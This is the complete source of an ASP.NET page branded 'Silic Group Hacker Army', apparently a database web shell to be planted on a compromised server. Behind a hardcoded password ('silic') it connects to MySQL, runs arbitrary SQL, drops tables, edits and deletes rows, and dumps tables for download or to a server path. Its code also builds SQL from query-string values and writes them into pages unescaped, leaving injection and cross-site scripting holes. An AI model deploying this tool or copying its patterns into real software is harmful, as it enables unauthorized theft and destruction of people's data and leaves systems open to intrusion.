<%@ Page Language="C#" %>

<%@ Import Namespace="System.Data" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Text" %>
<%@ Import Namespace="MySql.Data.MySqlClient" %>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head id="Head1" runat="server">
    <title>MYSQL Manager -Asp.net Silic Group Hacker Army专用版本</title>
    <style type="text/css">
body,td{font: 12px Arial,Tahoma;line-height: 16px;}
.input{font:12px Arial,Tahoma;background:#fff;border: 1px solid #666;padding:2px;height:18px;}
.area{font:12px 'Courier New', Monospace;background:#fff;border: 1px solid #666;padding:2px;}
.bt {border-color:#b0b0b0;background:#3d3d3d;color:#ffffff;font:12px Arial,Tahoma;height:22px;}
a {color: #00f;text-decoration:underline;}
a:hover{color: #f00;text-decoration:none;}
.alt1 td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#f1f1f1;padding:5px 10px 5px 5px;}
.alt2 td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#f9f9f9;padding:5px 10px 5px 5px;}
.focus td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#ffffaa;padding:5px 10px 5px 5px;}
.head td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#e9e9e9;padding:5px 10px 5px 5px;font-weight:bold;}
.head td span{font-weight:normal;}
form{margin:0;padding:0;}
h2{margin:0;padding:0;height:24px;line-height:24px;font-size:14px;color:#5B686F;}
ul.info li{margin:0;color:#444;line-height:24px;height:24px;}
u{text-decoration: none;color:#777;float:left;display:block;width:150px;margin-right:10px;}
p,div
{
line-height:260%;
}
</style>
<script runat="server">

    private string m_Admin = "silic";
    
    
    MySqlConnection DBConn = new MySqlConnection();
    private string connString = string.Empty;
    DataTable tblsDt = null;
    int tblRowsCount = 0;
    int tblsCount = 0;
    float tblDbSize = 0f;
    
    private bool OpenData()
    {
        if (Session["dbhost"] != null
            && Session["dbuser"] != null
            && Session["dbpass"] != null
            && Session["dbname"] != null
            && Session["dbport"] != null
            && Session["charset"] != null

            && Session["dbhost"].ToString().Trim() != string.Empty
            && Session["dbuser"].ToString().Trim() != string.Empty
            && Session["dbpass"].ToString().Trim() != string.Empty
            && Session["dbname"].ToString().Trim() != string.Empty
            && Session["dbport"].ToString().Trim() != string.Empty
            && Session["charset"].ToString().Trim() != string.Empty



            )
        {
            connString = string.Format("Host = {0}; UserName = {1}; Password = {2}; Database = {3}; Port = {4};CharSet={5};Allow Zero Datetime=true",
                      Session["dbhost"].ToString().Trim(),
                       Session["dbuser"].ToString().Trim(),
                       Session["dbpass"].ToString().Trim(),
                       Session["dbname"].ToString().Trim(),
                       Session["dbport"].ToString().Trim(),
                       Session["charset"].ToString().Trim()
                      );
        }
        if (connString != string.Empty && DBConn.State != ConnectionState.Open)
        {
            DBConn.ConnectionString = connString;
            try
            {
                DBConn.Open();
            }
            catch (Exception ex)
            {
                Response.Write("数据库连接失败，请检查连接字符串！" + ex.Message);
                return false;
            }
            return true;
        }
        return false;
    }
    private void CloseData()
    {
        DBConn.Close();
    }

    private string FindPK(string tablename)
    {
        string PKName = string.Empty;
        DataTable dt = RunTable("SHOW KEYS FROM " + tablename);
        for (int i = 0; i < dt.Rows.Count; i++)
        {
            if (dt.Rows[i]["Key_name"].ToString().ToUpper() == "PRIMARY")
            {
                PKName = dt.Rows[i]["Column_name"].ToString();
                break;
            }
        }
        return PKName;
    }

    private DataTable RunTable(string sqlstr)
    {
        DataTable data = new DataTable();
        MySqlDataAdapter da = new MySqlDataAdapter();
        try
        {
            OpenData();

            da.SelectCommand = new MySqlCommand(sqlstr, DBConn);
            da.Fill(data);
        }
        catch (Exception ex)
        {
            Response.Write("执行SQL错误：" + ex.Message + "<br>SQL:" + sqlstr);
            Response.End();
        }
        finally
        {
            da.Dispose();
            DBConn.Close();
        }
        return data;
    }
    private void ShowAllTable()
    {
        string sqlstr = "SHOW TABLE STATUS";
        tblsDt = RunTable(sqlstr);
        PanTables.Visible = true;
        tblRun.Visible = true;
    }

    private DataTable TableColumn(string tablename)
    {
        return RunTable("SHOW COLUMNS FROM " + tablename);
    }

    private DataTable TableStructure(string tablename)
    {
        return RunTable("SHOW FIELDS FROM " + tablename);
    }

    private bool isAuto_increment(string tblname, string columnname)
    {
        DataTable table = TableStructure(tblname);
        bool boolIs = false;
        for (int i = 0; i < table.Rows.Count; i++)
        {
            if (table.Rows[i]["Field"].ToString().ToUpper() == columnname.ToUpper())
            {
                if (table.Rows[i]["Extra"].ToString().ToLower() == "auto_increment")
                {
                    boolIs = true;
                    break;
                }
            }
        }
        return boolIs;
    }
    private void ShowTableData()
    {
        PanShow.Visible = true;
        tblRun.Visible = true;
        sql_query.Value = "SELECT * FROM " + Request.QueryString["tblname"] + " LIMIT 0, 30";
    }


    private void ShowEditeData()
    {
        PanelEdit.Visible = true;
        tblRun.Visible = true;
        sql_query.Value = "SELECT * FROM " + Request.QueryString["tblname"] + " LIMIT 0, 30";
    }

    private void Structure()
    {
        PanelStructure.Visible = true;
        tblRun.Visible = true;
        sql_query.Value = "SELECT * FROM " + Request.QueryString["tblname"] + " LIMIT 0, 30";
    }

    private void InsertData()
    {
        PanelInsert.Visible = true;
        tblRun.Visible = true;
        sql_query.Value = "SELECT * FROM " + Request.QueryString["tblname"] + " LIMIT 0, 30";
    }
    private void ExportSucc()
    {
        ShowAllTable();
        if (Session["exportinfo"] != null && Session["exportinfo"].ToString()!=string.Empty)
        {
            lblExport.Text = Session["exportinfo"].ToString();
            divSucc.Visible = true;
            Session["exportinfo"] = null;
        }
       
    }
    
    protected void Page_Load(object sender, EventArgs e)
    {
        if (Session["login"] == null || Session["login"].ToString().Length < 1)
        {
            PanelLogin.Visible = true;
        }
        else
        {
            PanelSucc.Visible = true;
        }
        
        if (!Page.IsPostBack)
        {
            txtpassword.Attributes.Add("onkeydown", "SubmitKeyClick('btnLogin');");
            InitFrm();

            if (OpenData())
            {
                ShowDBs();
                if (Request.QueryString["action"] != null)
                {
                    switch (Request.QueryString["action"].ToString())
                    {
                        case "show":
                            ShowTableData();
                            break;
                        case "edit":
                            ShowEditeData();
                            break;
                        case "deldata":
                            deldataData();
                            break;
                        case "insert":
                            InsertData();
                            break;
                        case "structure":
                            Structure();
                            break;
                        case "droptable":
                            DropTable();
                            break;
                        case "exportsucc":
                            ExportSucc();
                            break;
                    }
                }
                else
                {
                    ShowAllTable();
                }
            }
        }
        ShowConnForm();
    }
    private void InitFrm()
    {
        if (Session["dbhost"] != null)
            dbhost.Value = Session["dbhost"].ToString();

        if (Session["dbuser"] != null)
            dbuser.Value = Session["dbuser"].ToString();

        if (Session["dbpass"] != null)
            dbpass.Value = Session["dbpass"].ToString();

        if (Session["dbname"] != null)
            dbname.Value = Session["dbname"].ToString();

        if (Session["dbport"] != null)
            dbport.Value = Session["dbport"].ToString();

        if (Session["charset"] != null)
        {
            charset.SelectedIndex = -1;
            charset.Items.FindByValue(Session["charset"].ToString()).Selected = true;
        }
           //value="<%=Server.MapPath("MySQL.sql") %>"
        txtSavePath.Value = Server.MapPath(Request.ServerVariables["HTTP_HOST"].Replace(".", "").Replace(":", "") + "MySQL.sql");
    }

    private void ShowConnForm()
    {
        PanFrm.Visible = true;
    }

    protected void connect_ServerClick(object sender, EventArgs e)
    {
        connString = string.Format("Host = {0}; UserName = {1}; Password = {2}; Database = {3}; Port = {4};CharSet={5};Allow Zero Datetime=true",
            dbhost.Value.Trim(),
            dbuser.Value.Trim(),
            dbpass.Value.Trim(),
            dbname.Value.Trim(),
            dbport.Value.Trim(),
            charset.Value.Trim()
            );
        Session["dbhost"] = dbhost.Value.Trim();
        Session["dbuser"] = dbuser.Value.Trim();
        Session["dbpass"] = dbpass.Value.Trim();
        Session["dbname"] = dbname.Value.Trim();
        Session["dbport"] = dbport.Value.Trim();
        Session["charset"] = charset.Value.Trim();
        if (OpenData())
        {
            ShowDBs();
            //ShowAllTable();
        }
    }

    private string showSize(float size)
    {
        if (size > 1024 * 1024)
        {
            return Math.Round(size / (1024 * 1024), 3) + "M";
        }
        else if (size > 1024)
        {
            return Math.Round(size / 1024, 3) + "K";
        }
        else
        {
            return size + "B";
        }
    }

    protected void Submit1_ServerClick(object sender, EventArgs e)
    {
        if (sql_query.Value.Trim() != string.Empty)
        {
            if (OpenData())
            {
                PanelQuery.Visible = true;
            }
        }
        else
        {
            Response.Redirect(Request.ServerVariables["HTTP_REFERER"] + "", true);
        }
    }

    protected void Submit2_ServerClick(object sender, EventArgs e)
    {
        StringBuilder sb = new StringBuilder();
        string tblname = Request.QueryString["tblname"].Trim();

        DataTable dt = TableColumn(tblname);
        sb.Append(" update `" + tblname + "` set  ");

        for (int i = 0; i < dt.Rows.Count; i++)
        {
            if (i != 0)
                sb.Append(",");
            sb.Append("`" + dt.Rows[i][0].ToString().Trim() + "`=");
            string columntype = dt.Rows[i][1].ToString().Trim();
            bool mustAdd = false;
            if (columntype.IndexOf("char") != -1 || columntype.IndexOf("datetime") != -1 || columntype.IndexOf("string") != -1)
            {
                mustAdd = true;
            }
            if (mustAdd)
            {
                sb.Append("'");
            }
            sb.Append(Request.Form["insertsql_" + dt.Rows[i][0].ToString().Trim().Replace("'", "''")]);
            if (mustAdd)
            {
                sb.Append("'");
            }
        }
        sb.Append(" where " + Request.QueryString["pk"].ToString() + " = " + Request.QueryString["v"].ToString() + "");
        string sql = sb.ToString();
        RunTable(sql);
        Response.Redirect(Request.ServerVariables["Script_Name"] + "?action=show&tblname=" + tblname, true);
    }

    private void deldataData()
    {
        StringBuilder sb = new StringBuilder();
        string tblname = Request.QueryString["tblname"].Trim();

        sb.Append(" delete from  `" + tblname + "`   ");

        sb.Append(" where " + Request.QueryString["pk"].ToString() + " = " + Request.QueryString["v"].ToString() + "");
        string sql = sb.ToString();
        RunTable(sql);
        Response.Redirect(Request.ServerVariables["Script_Name"] + "?action=show&tblname=" + tblname, true);
    }

    private void ShowDBs()
    {
        string sql = "SHOW DATABASES";

        seldbname.DataSource = new DataTable();
        seldbname.DataBind();
        
        ListItem item = new ListItem("选择数据库", "");
        seldbname.Items.Add(item);

        DataTable dt = RunTable(sql);
        for (int i = 0; i < dt.Rows.Count; i++)
        { 
            string dname = dt.Rows[i][0].ToString();
            if (dname != "information_schema")
            {
                seldbname.Items.Add(new ListItem(dname, dname));
            }
        }
        
    }

    private void DropTable()
    {
        StringBuilder sb = new StringBuilder();
        string tblname = Request.QueryString["tblname"].Trim();

        sb.Append(" drop table `" + tblname + "`   ");

        string sql = sb.ToString();
        RunTable(sql);
        Response.Redirect(Request.ServerVariables["Script_Name"], true);
    }
    protected void btninsert_ServerClick(object sender, EventArgs e)
    {
        StringBuilder sb = new StringBuilder();
        string tblname = Request.QueryString["tblname"].Trim();

        DataTable dt = TableColumn(tblname);
        sb.Append(" insert into  `" + tblname + "` (  ");

        int m = 0;
        for (int i = 0; i < dt.Rows.Count; i++)
        {
            if (!isAuto_increment(tblname, dt.Rows[i][0].ToString()))
            {
                m++;
                if (m != 1)
                    sb.Append(",");
                sb.Append("`" + dt.Rows[i][0].ToString().Trim() + "`");
            }
        }
        sb.Append(" ) values (");
        m = 0;
        for (int i = 0; i < dt.Rows.Count; i++)
        {
            if (!isAuto_increment(tblname, dt.Rows[i][0].ToString()))
            {
                m++;
                if (m != 1)
                    sb.Append(",");

                string columntype = dt.Rows[i][1].ToString().Trim();
                bool mustAdd = false;
                if (columntype.IndexOf("char") != -1 || columntype.IndexOf("datetime") != -1 || columntype.IndexOf("string") != -1)
                {
                    mustAdd = true;
                }
                if (mustAdd)
                {
                    sb.Append("'");
                }
                sb.Append(Request.Form["insertsql_" + dt.Rows[i][0].ToString().Trim().Replace("'", "''")]);
                if (mustAdd)
                {
                    sb.Append("'");
                }
            }
        }
        sb.Append(" ) ");
        string sql = sb.ToString();

        Response.Write(sql);
        RunTable(sql);
        Response.Redirect(Request.ServerVariables["Script_Name"] + "?action=show&tblname=" + tblname, true);
    }





    protected void seldbname_SelectedIndexChanged(object sender, EventArgs e)
    {
        Session["dbname"] = seldbname.Items[seldbname.SelectedIndex].Value.ToString().Trim();
        Response.Redirect(Request.ServerVariables["Script_Name"] + "", true);
    }

    protected void btnLogin_Click(object sender, EventArgs e)
    {
        if (txtpassword.Value.Trim() == m_Admin)
        {
            Session["login"] = "login";
            Response.Redirect(Request.ServerVariables["Script_Name"] + "", true);
        }
    }

    


    //备份数据库
    private string sqldumptable(string tblname)
    {        
        StringBuilder sb = new StringBuilder();
        sb.Append("DROP TABLE IF EXISTS `" + tblname + "`;\n");
        sb.Append("CREATE TABLE " + tblname + " (\n");
        int firstfield=1;

        DataTable dtFields = RunTable("SHOW FIELDS FROM " + tblname + "");
        for (int i = 0, k = dtFields.Rows.Count; i < k; i++)
        {
            if (firstfield != 1)
                sb.Append(",\n");
            else
                firstfield = 0;
            sb.Append("`"+dtFields.Rows[i]["Field"].ToString() +"`  "+ dtFields.Rows[i]["Type"].ToString());
            if (dtFields.Rows[i]["Default"] != null && dtFields.Rows[i]["Default"].ToString() != string.Empty)
                sb.Append(" DEFAULT " + dtFields.Rows[i]["Default"]);
            if (dtFields.Rows[i]["Null"].ToString().ToUpper() != "YES")
                sb.Append(" NOT NULL ");
            if (dtFields.Rows[i]["Extra"].ToString() != "")
                sb.Append(dtFields.Rows[i]["Extra"].ToString());
        }
        dtFields.Dispose();

          
        DataTable dtKeys = RunTable("SHOW KEYS FROM " + tblname + "");
        bool haskey = false;
        string PRIMARY = string.Empty;
        for (int i = 0, k = dtKeys.Rows.Count; i < k; i++)
        {
            string kname = dtKeys.Rows[i]["Key_name"].ToString();
            if (kname.ToUpper() != "PRIMARY" && dtKeys.Rows[i]["Non_unique"].ToString().Trim() == "0")
            {
                kname = "UNIQUE|" + kname + "";
            }
            
            if (kname.ToUpper() == "PRIMARY")
            {
                if (haskey)
                {
                    PRIMARY = PRIMARY + ",";
                }
                else
                {
                    haskey = true;
                }
                PRIMARY = PRIMARY + dtKeys.Rows[i]["Column_name"];
            }
            else
            {
                sb.Append(",\n");
                if (kname.Length>6 && kname.Substring(0, 6).ToUpper() == "UNIQUE")
                {
                    kname = kname.Substring(7);
                }
                sb.Append(" KEY " + kname + " (" + dtKeys.Rows[i]["Column_name"] + ")");
            }
        }
        sb.Append(",\n PRIMARY KEY (" + PRIMARY + ") ");
        sb.Append("\n);\n\n");
        dtKeys.Dispose();

        DataTable dtRows = RunTable("SELECT * FROM " + tblname);

        for (int i = 0, k = dtRows.Rows.Count; i < k; i++)
        {
            sb.Append("INSERT INTO " + tblname + " VALUES(");
            int fieldcounter = -1;
            firstfield = 1;
            for (int m = 0, n = dtRows.Columns.Count; m < n; m++)
            {
                if (firstfield != 1)
                    sb.Append(", ");
                else
                    firstfield = 0;
                if (dtRows.Rows[i][m] == null)
                {
                    sb.Append("NULL");
                }
                else
                {
                    sb.Append("'" + dtRows.Rows[i][m].ToString().Trim().Replace("'", "''") + "'");
                }
            }
            sb.Append(");\n");
        }
        return sb.ToString();
    }

    private void SavetoFile(string info,string filepath)
    {
        FileStream stream = new FileStream(filepath, FileMode.Create, FileAccess.Write, FileShare.Delete | FileShare.ReadWrite);
        StreamWriter writer = new StreamWriter(stream);
        writer.WriteLine(info);
        writer.Close();
        stream.Close();
        stream.Dispose();
        writer.Dispose();
    }
    private void ExportDown(string info)
    {
        string filename = Request.ServerVariables["HTTP_HOST"] + "MySQL.sql";
        Response.ContentType = "application/unknown";
        Response.AddHeader("Content-Disposition", "attachment;filename=" + filename);
        Response.Write(info);
        Response.End();
    }

    protected void btnExport_ServerClick(object sender, EventArgs e)
    {
        string tables = string.Empty;
        StringBuilder infosb = new StringBuilder();
        if(Request.Form["tables"]!=null)
        {
            tables = Request.Form["tables"].ToString().Trim();
            string[] tableArr = tables.Split(',');
            for (int i = 0, k = tableArr.Length; i < k; i++)
            {
                if (tableArr[i].Trim() != string.Empty)
                {
                    infosb.Append(sqldumptable(tableArr[i].Trim()) + "\n\n\n\n\n\n");
                }
            }
            if (cbSaveFile.Checked)
            {
                SavetoFile(infosb.ToString(), txtSavePath.Value.Trim());
                Session["exportinfo"] = "<a href=\"" + txtSavePath.Value.Replace(Server.MapPath("now27347234.txt").Replace("now27347234.txt", ""), "") + "\" target=\"_blank\">" + txtSavePath.Value + "</a>";
                Response.Redirect(Request.ServerVariables["Script_Name"] + "?action=exportsucc", true);
            }
            else
            {
                ExportDown(infosb.ToString());
            }
        }
    }
</script>


<script language="javascript">

function SubmitKeyClick(button)
{   
   if (event.keyCode == 13)
   {       
      event.keyCode=9;
      event.returnValue = false;
      document.getElementById("btnLogin").click();
   }
}
function CheckAll(form) {
	for(var i=0;i<form.elements.length;i++) {
		var e = form.elements[i];
		if (e.name != 'chkall'&&e.name=="tables")
		e.checked = form.chkall.checked;
    }
}
</script>

</head>
<body>
    <form id="form1" runat="server">
        <div>
            <asp:Panel ID="PanelLogin" runat="server" Visible="false"  DefaultButton="btnLogin">
             <h2>
                    MYSQL Manager ( Silic Group Hacker Army ) &raquo;</h2>
                <span style="font: 11px Verdana;">密码: </span>
                <input name="password" type="password" size="20" id="txtpassword" runat="server">&nbsp;
                <asp:Button ID="btnLogin" runat="server" Text="登录" OnClick="btnLogin_Click" />&nbsp;
            </asp:Panel>
             <asp:Panel ID="PanelSucc" runat="server" Visible="false">
            <asp:Panel ID="PanFrm" runat="server" Visible="false">
                <h2>
                    MYSQL Manager ( Silic Group Hacker Army ) &raquo;</h2>
                <input id="action" type="hidden" name="action" value="sqladmin" runat="server" />
                <p>
                    主机IP:
                    <input class="input" name="dbhost" id="dbhost" value="localhost" type="text" size="20"
                        runat="server" />
                    :
                    <input class="input" name="dbport" id="dbport" value="3306" type="text" size="4"
                        runat="server" />
                    用户名:
                    <input class="input" name="dbuser" id="dbuser" value="root" type="text" size="15"
                        runat="server" />
                    密码:
                    <input class="input" name="dbpass" id="dbpass" type="text" size="15" runat="server" />
                    <span style="display:none">
                    数据库名:
                    <input class="input" name="dbname" id="dbname" type="text" size="15" runat="server" />
                    </span>
                    数据库编码:
                    <select class="input" id="charset" name="charset" runat="server" >
                        <option value="" selected>Default</option>
                        <option value="gbk">GBK</option>
                        <option value="big5">Big5</option>
                        <option value="utf8">UTF-8</option>
                        <option value="latin1">Latin1</option>
                    </select>
                    <input class="bt" name="connect" id="connect" value=" 连 接 " type="submit" size="100"
                        onserverclick="connect_ServerClick" runat="server" />
                </p>
                <p>
                选择数据库：&nbsp;
                <asp:DropDownList id="seldbname" runat="server" CssClass="input" AutoPostBack="True" OnSelectedIndexChanged="seldbname_SelectedIndexChanged">
                <asp:ListItem Text="选择数据库"></asp:ListItem>
                </asp:DropDownList>
                </p>
            </asp:Panel>
            <div>
                <%if (Session["dbname"] != null && Session["dbname"].ToString() != string.Empty)
              { %>
                当前数据库: <a href="?">
                    <%=dbname.Value %>
                </a>
                <%
                    } %>
                <%if (Request.QueryString["tblname"] != null)
                  { %>
                | 当前表: <a href="?action=show&tblname=<%=Request.QueryString["tblname"] %>">
                    <%=Request.QueryString["tblname"] %>
                </a>[ <a href="?action=insert&tblname=<%=Request.QueryString["tblname"] %>">添加</a>
                | <a href="?action=structure&tblname=<%=Request.QueryString["tblname"] %>">结构</a>
                | <a href="?action=droptable&tblname=<%=Request.QueryString["tblname"] %>" onclick="return confirm('确定删除表“<%=Request.QueryString["tblname"] %>”?')">
                    删除表</a> ]
                <%
                    } %>
            </div>
            
            
            <div style="background:#f1f1f1;border:1px solid #ddd;padding:15px;font:14px;text-align:center;font-weight:bold;" runat="server" visible="false" id="divSucc">
            数据库已经导出为<asp:Label ID="lblExport" runat="server">
            </asp:Label>
            
            </div>
            <table width="200" border="0" cellpadding="0" cellspacing="0" runat="server" id="tblRun"
                visible="false">
                <tr>
                    <td colspan="2">
                        运行SQL语句 :</td>
                </tr>
                <tr>
                    <td>
                        <textarea name="sql_query" class="area" style="width: 600px; height: 50px; overflow: auto;"
                            id="sql_query" runat="server"></textarea></td>
                    <td style="padding: 0 5px;">
                        <input class="bt" style="height: 50px;" name="submit" type="submit" value="Query"
                            id="Submit1" onserverclick="Submit1_ServerClick" runat="server" /></td>
                </tr>
            </table>
            <asp:Panel ID="PanelQuery" runat="server" Visible="false" EnableViewState="false">
             <%
                            DataTable dColumn = RunTable(sql_query.Value);
                             %>
                <table border="0" cellpadding="3" cellspacing="0">
                    <tr class="head">
                        <%
                           
                            for (int i = 0; i < dColumn.Columns.Count; i++)
                            {
                        %>
                        <td nowrap>
                            <%= dColumn.Columns[i].Caption%>
                        </td>
                        <%
                            }
                        %>
                    </tr>
                    <% 
                        DataTable dData = dColumn;

                        for (int i = 0; i < dData.Rows.Count; i++)
                        {
                    %>
                    <tr class="alt<%=i%2==0?"1":"2" %>" onmouseover="this.className='focus';" onmouseout="this.className='alt<%=i%2==0?"1":"2" %>';">
                        <%
 
                            for (int j = 0; j < dData.Columns.Count; j++)
                            {
                        %>
                        <td nowrap>
                            <%= dData.Rows[i][j].ToString()%>
                            &nbsp;</td>
                        <%
                            }
                        %>
                    </tr>
                    <%
                        }
                    %>
                </table>
                <br />
                <b>运行的SQL :</b>
                <%=sql_query.Value%>
            </asp:Panel>
            <asp:Panel ID="PanTables" runat="server" Visible="false" EnableViewState="false">
                <table border="0" cellpadding="0" cellspacing="0" width="99%" align="center">
                    <tr class="head">
                    <td width="2%" align="center"><input name="chkall" value="on" type="checkbox" onClick="CheckAll(this.form)" /></td>
                        <td>
                            Name</td>
                        <td>
                            Rows</td>
                        <td>
                            Data_length</td>
                        <td>
                            Create_time</td>
                        <td>
                            Update_time</td>
                    </tr>
                    <%
                        for (int i = 0; i < tblsDt.Rows.Count; i++)
                        {
                            tblRowsCount += int.Parse(tblsDt.Rows[i]["Rows"].ToString());
                            tblsCount++;
                            tblDbSize += float.Parse(tblsDt.Rows[i]["Data_length"].ToString());    
                    %>
                    <tr class="alt<%=i%2==0?"1":"2" %>">
                    <td align="center" width="2%">
                    <input type="checkbox" name="tables" value="<%= tblsDt.Rows[i]["Name"]%>" />
                    </td>
                        <td>
                            <a href="?action=show&tblname=<%= tblsDt.Rows[i]["Name"]%>">
                                <%= tblsDt.Rows[i]["Name"]%>
                            </a>[ <a href="?action=insert&tblname=<%= tblsDt.Rows[i]["Name"]%>">添加</a> | <a href="?action=structure&tblname=<%= tblsDt.Rows[i]["Name"]%>">
                                结构</a> | <a href="?action=droptable&tblname=<%= tblsDt.Rows[i]["Name"]%>" onclick="return confirm('确定删除表“<%= tblsDt.Rows[i]["Name"]%>”？')">
                                    删除表</a> ]
                        </td>
                        <td>
                            <%= tblsDt.Rows[i]["Rows"]%>
                        </td>
                        <td>
                            <%= showSize(float.Parse(tblsDt.Rows[i]["Data_length"].ToString()))%>
                        </td>
                        <td>
                            <%= tblsDt.Rows[i]["Create_time"]%>
                        </td>
                        <td>
                            <%= tblsDt.Rows[i]["Update_time"]%>
                        </td>
                    </tr>
                    <%
                        } 
                    %>
                    <tr class="alt1">
                    <td>&nbsp;</td>
                        <td>
                            合计：<%= tblsCount%>
                        </td>
                        <td>
                            <%= tblRowsCount%>
                        </td>
                        <td>
                            <%= showSize(tblDbSize)%>
                        </td>
                        <td colspan="2">
                            &nbsp;</td>
                    </tr>
                    <tr class="alt2">
                    <td colspan="6">
                        <input name="saveasfile" value="1" type="checkbox" id="cbSaveFile" runat="server" /> 保存为文件 
                        <input class="input" name="path"  type="text" size="60" id="txtSavePath" runat="server" />
                        <input class="bt" type="submit" name="downrar" value="导出所选表" id="btnExport" runat="server" onserverclick="btnExport_ServerClick" />
                    </td>
                    </tr>
                </table>
            </asp:Panel>
            <asp:Panel ID="PanShow" runat="server" Visible="false" EnableViewState="false">
                <table border="0" cellpadding="3" cellspacing="0">
                    <tr class="head">
                        <td>
                            Action</td>
                        <%
                            DataTable dColumn = TableColumn(Request.QueryString["tblname"].ToString().Trim());
                            for (int i = 0; i < dColumn.Rows.Count; i++)
                            {
                        %>
                        <td nowrap>
                            <%= dColumn.Rows[i][0]%>
                            <br>
                            <span>
                                <%= dColumn.Rows[i][1]%>
                            </span>
                        </td>
                        <%
                            }
                        %>
                    </tr>
                    <% 
                        DataTable dData = RunTable(sql_query.Value);
                        string tblPkName = FindPK(Request.QueryString["tblname"].ToString().Trim());
                        for (int i = 0; i < dData.Rows.Count; i++)
                        {
                    %>
                    <tr class="alt<%=i%2==0?"1":"2" %>" onmouseover="this.className='focus';" onmouseout="this.className='alt<%=i%2==0?"1":"2" %>';">
                        <td nowrap>
                            <%if (tblPkName != string.Empty)
                              {%>
                            <a href="?action=edit&tblname=<%=Request.QueryString["tblname"] %>&pk=<%=tblPkName %>&v=<%=dData.Rows[i][tblPkName] %>">
                                编辑</a> | <a href="?action=deldata&tblname=<%=Request.QueryString["tblname"] %>&pk=<%=tblPkName %>&v=<%=dData.Rows[i][tblPkName] %>"
                                    onclick="return confirm('确定删除该记录？')">删除</a>
                            <%
                                } %>
                        </td>
                        <%
 
                            for (int j = 0; j < dData.Columns.Count; j++)
                            {
                        %>
                        <td nowrap>
                            <%= dData.Rows[i][j]%>
                            &nbsp;</td>
                        <%
                            }
                        %>
                    </tr>
                    <%
                        }
                    %>
                </table>
            </asp:Panel>
            <asp:Panel ID="PanelEdit" runat="server" Visible="false" EnableViewState="false">
                <h2>
                    在表<%=Request.QueryString["tblname"].Trim() %>中编辑记录 &raquo;</h2>
                <table border="0" cellpadding="3" cellspacing="0">
                    <%
                        DataTable dColumn = TableColumn(Request.QueryString["tblname"].ToString().Trim());
                        DataTable editData = RunTable("select * from " + Request.QueryString["tblname"].ToString() + " where " + Request.QueryString["pk"].ToString() + " = " + Request.QueryString["v"].ToString() + "");

                        if (editData.Rows.Count > 0)
                        {
                            for (int i = 0; i < dColumn.Rows.Count; i++)
                            {
                    %>
                    <tr class="alt<%=i%2==0?"1":"2" %>" onmouseover="this.className='focus';" onmouseout="this.className='alt<%=i%2==0?"1":"2" %>';">
                        <td>
                            <b>
                                <%= dColumn.Rows[i][0]%>
                            </b>
                            <br />
                            <%= dColumn.Rows[i][1]%>
                        </td>
                        <td>
                            <textarea class="area" name="insertsql_<%= dColumn.Rows[i][0]%>" style="width: 500px;
                                height: 60px; overflow: auto;"><%=editData.Rows[0][dColumn.Rows[i][0].ToString().Trim()]%></textarea></td>
                    </tr>
                    <%
                        }
                   
                            
                    %>
                    <tr class="alt2">
                        <td colspan="2">
                            <input class="bt" type="submit" name="update" value="更新" id="Submit2" runat="server"
                                onserverclick="Submit2_ServerClick" />
                        </td>
                    </tr>
                    <% } %>
                </table>
            </asp:Panel>
            <asp:Panel ID="PanelInsert" runat="server" Visible="false" EnableViewState="false">
                <h2>
                    在表<%=Request.QueryString["tblname"].Trim() %>中添加记录 &raquo;</h2>
                <table border="0" cellpadding="3" cellspacing="0">
                    <%
                        DataTable dColumn = TableColumn(Request.QueryString["tblname"].ToString().Trim());


                        for (int i = 0; i < dColumn.Rows.Count; i++)
                        {
                    %>
                    <tr class="alt<%=i%2==0?"1":"2" %>" onmouseover="this.className='focus';" onmouseout="this.className='alt<%=i%2==0?"1":"2" %>';">
                        <td>
                            <b>
                                <%= dColumn.Rows[i][0]%>
                            </b>
                            <br />
                            <%= dColumn.Rows[i][1]%>
                        </td>
                        <td>
                            <textarea class="area" name="insertsql_<%= dColumn.Rows[i][0]%>" style="width: 500px;
                                height: 60px; overflow: auto;"></textarea></td>
                    </tr>
                    <%
                        }
                   
                            
                    %>
                    <tr class="alt2">
                        <td colspan="2">
                            <input class="bt" type="submit" name="btninsert" value="添加" id="btninsert" runat="server"
                                onserverclick="btninsert_ServerClick" />
                        </td>
                    </tr>
                </table>
            </asp:Panel>
            <asp:Panel ID="PanelStructure" runat="server" Visible="false" EnableViewState="false">
                <h2>
                    表<%=Request.QueryString["tblname"].Trim() %>的结构 &raquo;</h2>
                <table border="0" cellpadding="3" cellspacing="0">
                    <tr class="head">
                        <td>
                            Field</td>
                        <td>
                            Type</td>
                        <td>
                            Null</td>
                        <td>
                            Key</td>
                        <td>
                            Default</td>
                        <td>
                            Extra</td>
                    </tr>
                    <%
                        DataTable dColumn = TableStructure(Request.QueryString["tblname"].ToString().Trim());


                        for (int i = 0; i < dColumn.Rows.Count; i++)
                        {
                    %>
                    <tr class="alt<%=i%2==0?"1":"2" %>" onmouseover="this.className='focus';" onmouseout="this.className='alt<%=i%2==0?"1":"2" %>';">
                        <td>
                            <%= dColumn.Rows[i][0]%>
                        </td>
                        <td>
                            <%= dColumn.Rows[i][1]%>
                        </td>
                        <td>
                            &nbsp;</td>
                        <td>
                            <%= dColumn.Rows[i][2]%>
                            &nbsp;</td>
                        <td>
                            <%= dColumn.Rows[i][3]%>
                            &nbsp;</td>
                        <td>
                            <%= dColumn.Rows[i][4]%>
                            &nbsp;</td>
                    </tr>
                    <%
                    
                        } %>
                </table>
            </asp:Panel>
            </asp:Panel>
        </div>
    </form>
    Rewrite Powered by <a href="http://blackbap.org" target="_blank">blackbap.org</a>
</body>
</html>